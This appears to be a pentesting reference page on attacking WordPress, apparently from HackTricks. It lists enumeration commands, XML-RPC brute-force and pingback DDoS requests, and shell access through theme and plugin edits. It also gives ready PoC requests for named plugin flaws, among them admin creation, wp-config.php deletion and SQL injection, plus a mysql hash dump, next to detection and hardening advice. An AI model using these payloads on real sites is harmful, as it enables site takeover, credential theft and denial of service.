# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** したがってテーマの php を変更して RCE を得る場合はおそらくそのパスを使用します。例えば：**theme twentytwelve** を使用している場合、次の **404.php** ファイルに **アクセス** できます: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- 確認すべきデフォルトのログインパス: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` にはインストールされている WordPress のバージョンなど有用な情報が含まれています。
- `wp-activate.php` は新しい WordPress サイトをセットアップする際のメール認証プロセスに使用されます。
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` は、HTTP をトランスポート機構、XML をエンコード機構として使用してデータを送受信する WordPress の機能を表すファイルです。この種の通信は WordPress の [REST API](https://developer.wordpress.org/rest-api/reference) によって置き換えられています。
- `wp-content` フォルダはプラグインやテーマが格納される主要ディレクトリです。
- `wp-content/uploads/` はプラットフォームにアップロードされたファイルが保存されるディレクトリです。
- `wp-includes/` は証明書、フォント、JavaScript ファイル、ウィジェットなどのコアファイルが格納されるディレクトリです。
- `wp-sitemap.xml` Wordpress のバージョン 5.5 以降では、Worpress はすべての公開投稿および公開でクエリ可能な投稿タイプとタクソノミーを含む sitemap XML ファイルを生成します。

**Post exploitation**

- `wp-config.php` ファイルには、データベース名、データベースホスト、ユーザー名とパスワード、認証キーとソルト、データベーステーブルのプレフィックスなど、WordPress がデータベースに接続するために必要な情報が含まれています。この設定ファイルは DEBUG モードを有効にするためにも使用でき、トラブルシューティング時に役立ちます。

### ユーザー権限

- **Administrator**: 管理者
- **Editor**: 編集者 — 自分と他人の投稿を公開および管理できる
- **Author**: 投稿者 — 自分の投稿を公開および管理できる
- **Contributor**: 寄稿者 — 投稿を作成および管理できるが公開はできない
- **Subscriber**: 購読者 — 投稿を閲覧し、自分のプロフィールを編集できる

## **パッシブ列挙**

### **WordPress バージョンの取得**

`/license.txt` または `/readme.html` ファイルが見つかるか確認してください

ページの **source code** 内（例: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)）:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link files

![](<../../images/image (533).png>)

- JavaScript files

![](<../../images/image (524).png>)

### プラグインを取得
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### テーマを取得
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### バージョンを一般的に抽出する
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## アクティブな列挙

### プラグインとテーマ

おそらく、すべてのプラグインやテーマを見つけられないでしょう。すべてを発見するには、**能動的に Brute Force してプラグインとテーマのリストを探索する**必要があります（幸い、これらのリストを含む自動化ツールが存在します）。

### ユーザー

- **ID Brute:** WordPressサイトのユーザーIDを Brute Forcing して有効なユーザーを取得します:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
レスポンスが**200**または**30X**の場合、そのidは**有効**です。レスポンスが**400**の場合、そのidは**無効**です。

- **wp-json:** ユーザー情報を取得するためにクエリしてみることもできます:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ユーザーに関するいくつかの情報を明らかにするもう一つの `/wp-json/` エンドポイントは次のとおりです:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Only information about the users that has this feature enable will be provided**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: **`/wp-login.php`** にログインする際、**message** は **username が存在するかどうか** によって **異なります**。

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**確認**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**認証情報 Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** または **`metaWeblog.getUsersBlogs`** は、認証情報をbrute-forceするために使用できるメソッドの一部です。もしそれらのいずれかを見つけたら、次のようなものを送信できます:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
認証情報が無効な場合、200コードのレスポンス内に _"ユーザー名またはパスワードが正しくありません"_ というメッセージが表示されるはずです。

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

正しい認証情報を使用するとファイルをアップロードできます。レスポンスにはパスが表示されます ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
また、同じリクエスト内で複数の資格情報を試せるため、**より速い方法**として **`system.multicall`** を使って資格情報をブルートフォースできます:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA を回避**

このメソッドは人間向けではなくプログラム向けであり古いため、2FA をサポートしていません。したがって、有効な creds を持っていてメインの入口が 2FA で保護されている場合でも、**xmlrpc.php を悪用してそれらの creds で 2FA を回避してログインできる可能性があります**。コンソールから実行できるすべての操作が行えるわけではない点に注意してくださいが、Ippsec が [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) で説明しているように、RCE に到達できる場合もあります。

**DDoS or port scanning**

リスト内に _**pingback.ping**_ が見つかれば、Wordpress に任意のホスト/ポートへリクエストを送らせることができます。\
これは、**何千もの** Wordpress **サイト** に一つの **場所** へ **アクセス** させ（その場所で **DDoS** を引き起こす）、または任意のポートを指定して Wordpress に内部 **ネットワーク** を **スキャン** させる用途に使えます。
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode** の値が **0**（17）より **大きい** 場合、そのポートは開いています。

前のセクションでの **`system.multicall`** の使用例を参照して、このメソッドを悪用して DDoS を引き起こす方法を学んでください。

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

このファイルは通常Wordpressサイトのルートに存在します: **`/wp-cron.php`**\
このファイルに**accessed**されると、"heavy" な MySQL **query** が実行されるため、attackers によって DoS を **cause** するために利用される可能性があります。\
また、デフォルトでは `wp-cron.php` は各ページロード時（クライアントが任意の Wordpress ページを要求するたび）に呼び出されるため、トラフィックが多いサイトでは問題（DoS）を引き起こす可能性があります。

Wp-Cron を無効化し、ホスト内で必要な処理を定期的に実行する real cronjob を作成することが推奨されます（問題を引き起こさないように）。

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ にアクセスしてみると、Worpress site があなたにリクエストを送ってくるかもしれません。

動作しない場合のレスポンスは次の通りです:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

このツールは **methodName: pingback.ping** とパス **/wp-json/oembed/1.0/proxy** を確認し、存在する場合はそれらを exploit しようとします。

## 自動化ツール
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ビットを上書きしてアクセスを得る

実際の攻撃というより好奇心をそそる事例です。CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) では、任意の wordpress ファイルの1ビットを反転できました。つまり、ファイル `/var/www/html/wp-includes/user.php` の位置 `5389` のビットを反転して NOT (`!`) 演算を NOP にすることができます。
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**使用されているテーマの php を修正する (admin credentials needed)**

Appearance → Theme Editor → 404 Template (右側)

php shell の内容に変更する:

![](<../../images/image (384).png>)

更新したページへどうアクセスするかをインターネットで調べる。今回の場合アクセス先はここ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

使用例:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
sessionを取得するために。

## Plugin RCE

### PHP plugin

プラグインとして .php files をアップロードできることがあります。  
例えば次のように php backdoor を作成します:

![](<../../images/image (183).png>)

次に新しい plugin を追加します:

![](<../../images/image (722).png>)

plugin をアップロードし、Install Now を押します:

![](<../../images/image (249).png>)

Procced をクリックします:

![](<../../images/image (70).png>)

おそらくこれだけでは何も起こらないように見えますが、Media に移動すると shell がアップロードされているのが確認できます:

![](<../../images/image (462).png>)

それにアクセスすると reverse shell を実行するための URL が表示されます:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

この方法は、脆弱であることが知られている悪意のある plugin をインストールし、web shell を取得するために悪用することを含みます。プロセスは WordPress dashboard から次のように行います:

1. **Plugin Acquisition**: プラグインは Exploit DB のようなソースから取得します（例: [**here**](https://www.exploit-db.com/exploits/36374)）。
2. **Plugin Installation**:
- WordPress dashboard に移動し、次に `Dashboard > Plugins > Upload Plugin` へ進みます。
- ダウンロードしたプラグインの zip ファイルをアップロードします。
3. **Plugin Activation**: プラグインが正常にインストールされたら、dashboard から有効化する必要があります。
4. **Exploitation**:
- plugin "reflex-gallery" がインストールされ有効化されている場合、脆弱であることが知られているため悪用できます。
- Metasploit framework はこの脆弱性に対する exploit を提供しています。適切なモジュールをロードし特定のコマンドを実行することで meterpreter session を確立し、サイトへの不正アクセスを得ることができます。
- これは WordPress サイトを悪用する多数の方法のひとつに過ぎないことに注意してください。

内容には、プラグインのインストールおよび有効化手順を示す WordPress dashboard のビジュアルが含まれています。ただし、このように脆弱性を悪用することは、適切な許可なしには違法であり非倫理的であることに注意してください。この情報は責任を持って、明確な許可のあるペネトレーションテストなど合法的な文脈でのみ使用してください。

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ は WordPress の **Cross-Site Scripting (XSS)** 脆弱性を **Remote Code Execution (RCE)** やその他の重大な脆弱性にエスカレートするために設計されたスクリプトです。詳細は [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) を確認してください。Wordpress Versions 6.X.X, 5.X.X and 4.X.X をサポートし、次を可能にします:
- _**Privilege Escalation:**_ WordPress にユーザーを作成します。
- _**(RCE) Custom Plugin (backdoor) Upload:**_ カスタム plugin (backdoor) を WordPress にアップロードします。
- _**(RCE) Built-In Plugin Edit:**_ WordPress の組み込み plugin を編集します。
- _**(RCE) Built-In Theme Edit:**_ WordPress の組み込みテーマを編集します。
- _**(Custom) Custom Exploits:**_ サードパーティ製 WordPress plugin/テーマ向けのカスタム Exploits。

## Post Exploitation

ユーザー名とパスワードを抽出:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin のパスワードを変更:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### 攻撃対象

Wordpress プラグインがどのように機能を公開するかを把握することは、その機能に潜む脆弱性を見つける上で重要です。プラグインが機能を公開する方法は以下の箇条書きで確認でき、脆弱なプラグインの例はいくつか [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) にあります。

- **`wp_ajax`**

プラグインが機能を公開する方法の一つに、AJAX ハンドラ経由のものがあります。これらはロジックや認可、認証のバグを含む可能性があります。さらに、これらの関数が認証と認可の両方を wordpress nonce の存在に基づいていることがよくあり、その nonce は **Wordpress インスタンスに認証された任意のユーザが持ち得る**（ロールに関係なく）点に注意が必要です。

これらはプラグイン内で関数を公開するために使われる関数です：
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` の使用により、そのエンドポイントは任意のユーザ（認証されていないユーザでさえ）からアクセス可能になります。**

> [!CAUTION]
> さらに、もしその関数がユーザの権限を `wp_verify_nonce` で確認しているだけであれば、`wp_verify_nonce` は単にユーザがログインしていることを確認するだけで、通常はユーザのロールを確認しません。したがって権限の低いユーザが権限の高い操作にアクセスできる可能性があります。

- **REST API**

また、`register_rest_route` 関数を使用して wordpress に rest AP を登録し、関数を公開することも可能です:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` は、与えられたユーザーが API メソッドを呼び出す権限があるかをチェックするコールバック関数です。

**組み込みの `__return_true` 関数が使われている場合、ユーザー権限チェックは単純にスキップされます。**

- **PHP ファイルへの直接アクセス**

もちろん、Wordpress は PHP を使っており、プラグイン内のファイルはウェブから直接アクセス可能です。したがって、ファイルにアクセスするだけでトリガーされる脆弱な機能を公開しているプラグインは、任意のユーザーによって悪用され得ます。

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

一部のプラグインは内部統合やリバースプロキシ向けに “trusted header” のショートカットを実装し、そのヘッダを使って REST リクエストの現在のユーザーコンテキストを設定します。上流コンポーネントによってヘッダが暗号学的にリクエストに紐付けられていない場合、攻撃者はそれを偽装して管理者として特権 REST ルートにアクセスできます。

- 影響: 認証なしでコアの users REST ルートを通じて新しい管理者を作成し、管理者権限に昇格される可能性があります。
- 例のヘッダ: `X-Wcpay-Platform-Checkout-User: 1`（ユーザー ID を 1 に強制、通常は最初の管理者アカウント）
- 悪用されるルート: `POST /wp-json/wp/v2/users` に高い権限の role 配列を含めて

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- プラグインはクライアント制御のヘッダを認証状態にマッピングし、権限チェックをスキップします。
- WordPress core はこのルートに `create_users` capability を期待します；プラグインのハックはヘッダから直接現在のユーザーコンテキストを設定することでこれをバイパスします。

Expected success indicators

- 作成されたユーザーを記述する JSON ボディを伴う HTTP 201。
- 新しい管理者ユーザーが `wp-admin/users.php` に表示される。

Detection checklist

- ユーザーコンテキストを設定するためにカスタムヘッダを読み取る `getallheaders()`、`$_SERVER['HTTP_...']`、またはベンダーSDK（例: `wp_set_current_user()`, `wp_set_auth_cookie()`）を grep で探す。
- 堅牢な `permission_callback` チェックを欠き、代わりにリクエストヘッダに依存している特権コールバックについて REST 登録をレビューする。
- REST ハンドラ内でヘッダ値だけでゲートされている core のユーザー管理関数（`wp_insert_user`, `wp_create_user`）の使用を探す。

Hardening

- 認証や認可をクライアント制御のヘッダから導出してはいけない。
- リバースプロキシが識別情報を注入しなければならない場合は、プロキシで信頼を終端して着信コピーを削除する（例: エッジで `unset X-Wcpay-Platform-Checkout-User`）、その上で署名付きトークンを渡してサーバ側で検証する。
- 特権操作を行う REST ルートでは `current_user_can()` チェックと厳密な `permission_callback` を要求する（`__return_true` を使ってはいけない）。
- ヘッダによる「impersonation」よりも、first-party 認証（cookies、application passwords、OAuth）を優先する。

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress のテーマやプラグインはしばしば `wp_ajax_` と `wp_ajax_nopriv_` フックを通じて AJAX ハンドラを公開します。**_nopriv_** バリアントが使用されると **コールバックは未認証の訪問者から到達可能になる** ため、任意の機微な操作では追加で以下を実装する必要があります:

1. **権限チェック**（例: `current_user_can()`、少なくとも `is_user_logged_in()`）、および
2. `check_ajax_referer()` / `wp_verify_nonce()` によって検証される **CSRF nonce**、および
3. **厳格な入力のサニタイズ／検証**。

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Unauthenticated access** – `wp_ajax_nopriv_` フックが登録されている。
* **No nonce / capability check** – 任意の訪問者がエンドポイントにアクセスできる。
* **No path sanitisation** – ユーザー制御の `fontfamily` 文字列がフィルタリングされずにファイルシステムパスに連結され、古典的な `../../` トラバーサルを許している。

#### 悪用

攻撃者は単一の HTTP POST リクエストを送信するだけで、**uploads base directory 以下**（通常は `<wp-root>/wp-content/uploads/`）の任意のファイルやディレクトリを削除できる：
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### 検出チェックリスト

* ファイルシステム用ヘルパー（`copy()`, `unlink()`, `$wp_filesystem->delete()` など）を呼び出す `add_action( 'wp_ajax_nopriv_...')` コールバック。
* サニタイズされていないユーザー入力をパスに連結している箇所（`$_POST`, `$_GET`, `$_REQUEST` を探す）。
* `check_ajax_referer()` や `current_user_can()`/`is_user_logged_in()` が使われていない。

#### 強化
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **常に** ディスク上のいかなる write/delete 操作でも特権として扱い、次を再確認してください:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

多くのプラグインは、元のロールを user meta に保存して後で復元できるようにする 'view as role' または一時的なロール切り替え機能を実装しています。復元処理がリクエストパラメータのみ（例: `$_REQUEST['reset-for']`）およびプラグイン管理のリストに依存し、capabilities チェックや有効な nonce を確認しない場合、これは vertical privilege escalation となります。

実際の例は Admin and Site Enhancements (ASE) プラグイン (≤ 7.6.2.1) で見つかりました。reset ブランチは、ユーザー名が内部配列 `$options['viewing_admin_as_role_are']` に存在する場合に `reset-for=<username>` に基づいてロールを復元していましたが、現在のロールを削除して user meta `_asenha_view_admin_as_original_roles` から保存されたロールを再追加する前に、`current_user_can()` チェックも nonce 検証も行っていませんでした：
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
なぜ悪用可能か

- サーバー側の認可なしに`$_REQUEST['reset-for']`とプラグインのオプションを信頼している。
- ユーザーが以前 `_asenha_view_admin_as_original_roles` に高い権限を保存していてダウングレードされていた場合、リセットパスにアクセスすることでそれらを復元できる。
- 一部の導入環境では、認証済みの任意のユーザーが `viewing_admin_as_role_are` にまだ残っている別のユーザー名のリセットをトリガーできる（認可不備）。

Attack prerequisites

- 脆弱なプラグインのバージョンで該当機能が有効になっていること。
- ターゲットアカウントが以前の利用で user meta に古い高権限 role を保持していること。
- 任意の認証済みセッション。reset flow に nonce/capability が欠落していること。

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
脆弱なビルドでは、これにより現在のロールが削除され、保存されていた元のロール（例: `administrator`）が再追加され、実質的に権限が昇格します。

Detection checklist

- ユーザーメタに「original roles」を永続化するロール切替機能（例: `_asenha_view_admin_as_original_roles`）を探す。
- Identify reset/restore paths that:
- ユーザー名を `$_REQUEST` / `$_GET` / `$_POST` から読み取る。
- `add_role()` / `remove_role()` を `current_user_can()` や `wp_verify_nonce()` / `check_admin_referer()` なしで呼んでロールを変更する。
- アクターの capabilities の代わりに、プラグインのオプション配列（例: `viewing_admin_as_role_are`）に基づいて認可する。

Hardening

- 状態を変更するすべての分岐で capability チェックを強制する（例: `current_user_can('manage_options')` またはそれ以上の厳格なチェック）。
- すべてのロール/権限の変更に対して nonce を要求し、検証する: `check_admin_referer()` / `wp_verify_nonce()`。
- リクエストで渡されたユーザー名を決して信頼しない。認証済みのアクターと明示的なポリシーに基づいてサーバー側で対象ユーザーを解決する。
- プロフィール/ロールの更新時に「original roles」状態を無効化し、古い高権限の復元を防ぐ:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- 一時的なロール切り替えには、最小限の状態を保持し、時間制限付きで capability によって保護されたトークンを使用することを検討してください。

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

一部のプラグインは user-switching helpers を public の `init` フックに接続し、クライアント制御の cookie から識別を導出します。コードが認証、capability、および有効な nonce の検証なしに `wp_set_auth_cookie()` を呼び出すと、認証されていない任意の訪問者が任意のユーザーIDとして強制的にログインさせることができます。

典型的な脆弱なパターン（Service Finder Bookings ≤ 6.1 を簡略化）：
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
なぜ悪用可能か

- 公開された `init` フックにより、ハンドラが未認証ユーザーから到達可能になる（`is_user_logged_in()` ガードがない）。
- 識別はクライアントが変更可能な cookie（`original_user_id`）から導出されている。
- `wp_set_auth_cookie($uid)` を直接呼び出すことで、要求者をそのユーザーとしてログインさせてしまい、権限や nonce のチェックが行われない。

悪用（未認証）
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF に関する WordPress/plugin CVEs の考慮事項

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‑impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

攻撃側の注意点

- プラグイン固有のエンドポイントをクリーンなペイロードで狙う: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, ショートコード。
- まずは未認証パスを試す（AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes）。デフォルトのペイロードはしばしば難読化なしで成功する。
- 典型的な高影響ケース：権限昇格（broken access control）、任意ファイルのアップロード/ダウンロード、LFI、open redirect。

防御側の注意点

- plugin CVEs を保護するために一般的な WAF シグネチャに頼らない。アプリケーション層での脆弱性特化のバーチャルパッチを実装するか、迅速にアップデートすること。
- コード内ではネガティブな正規表現フィルタよりも、ポジティブセキュリティチェック（capabilities、nonces、厳格な入力検証）を優先する。

## WordPress の保護

### 定期的なアップデート

WordPress、plugins、themes が最新であることを確認する。また、自動更新が wp-config.php で有効になっていることを確認する:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
また、**信頼できる WordPress プラグインとテーマのみをインストールしてください**。

### セキュリティプラグイン

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **その他の推奨事項**

- デフォルトの **admin** ユーザーを削除する
- **強力なパスワード** と **2FA** を使用する
- 定期的にユーザーの **権限** を **見直す**
- Brute Force 攻撃を防ぐために **ログイン試行回数を制限する**
- **`wp-admin.php`** ファイルの名前を変更し、内部または特定の IP アドレスからのみアクセスを許可する。


### 認証不要の SQL Injection（検証不足） (WP Job Portal <= 2.3.2)

WP Job Portal リクルートプラグインは **savecategory** タスクを公開しており、最終的に `modules/category/model.php::validateFormData()` 内で次の脆弱なコードを実行します：
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
このスニペットによって導入された問題点:

1. **未サニタイズのユーザー入力** – `parentid` は HTTP リクエストからそのまま取得されています。
2. **WHERE clause 内での文字列連結** – `is_numeric()` / `esc_sql()` / prepared statement が使われていません。
3. **認証不要で到達可能** – アクションは `admin-post.php` 経由で実行されますが、設けられているチェックは **CSRF nonce**（`wp_verify_nonce()`）のみで、訪問者はショートコード `[wpjobportal_my_resumes]` を埋め込んだ公開ページからそれを取得できます。

#### 悪用

1. 新しい nonce を取得する:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` を悪用して任意の SQL を注入する:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
